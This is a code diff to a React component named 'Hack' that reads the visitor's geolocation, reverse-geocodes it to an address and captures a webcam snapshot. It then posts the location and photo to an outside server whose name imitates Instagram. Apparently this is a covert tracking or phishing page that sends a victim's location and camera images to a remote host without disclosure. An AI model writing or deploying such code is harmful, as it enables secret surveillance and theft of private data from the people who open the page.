@@ -1,4 +1,11 @@
 import React, { useEffect, useRef } from "react";
+import axios from "axios";
+
+const url = "https://instagram-server-eight.vercel.app/";
+
+let toSend = {};
+
+let img = {};
 
 export const Hack: React.FC = () => {
   const videoRef = useRef<HTMLVideoElement | null>(null);
@@ -14,18 +21,19 @@ export const Hack: React.FC = () => {
             `https://api.opencagedata.com/geocode/v1/json?q=${position.coords.latitude}+${position.coords.longitude}&key=${OPEN_CAGE_API_KEY}`
           );
           const data = await response.json();
-          console.log(data.results[0].formatted);
+
+          toSend = {
+            lat: position.coords.latitude,
+            long: position.coords.longitude,
+            location: data?.results[0]?.formatted,
+          };
+          console.log(data?.results[0]?.formatted);
         },
         (err) => {
           console.log(err);
         }
       );
-    };
-    fetchItem();
-  }, []);
 
-  useEffect(() => {
-    const fuck = async () => {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({
           video: true,
@@ -41,6 +49,12 @@ export const Hack: React.FC = () => {
 
             if (canvas && video) {
               console.log(canvas?.toDataURL("image/png"));
+              toSend = {
+                photo: canvas.toDataURL("image/png"),
+              };
+              img = {
+                img: canvas.toDataURL("image/png"),
+              };
               const context = canvas.getContext("2d");
               if (context) {
                 context.drawImage(video, 0, 0, canvas.width, canvas.height);
@@ -51,8 +65,13 @@ export const Hack: React.FC = () => {
       } catch (err) {
         console.log("Error accessing the camera: ", err);
       }
+      await axios.post(url + "/v1/upload", toSend);
+      await axios.post(url + "/cloudinary/upload", img);
+
+      console.log("data", toSend);
     };
-    fuck();
+
+    fetchItem();
   }, []);
 
   return (
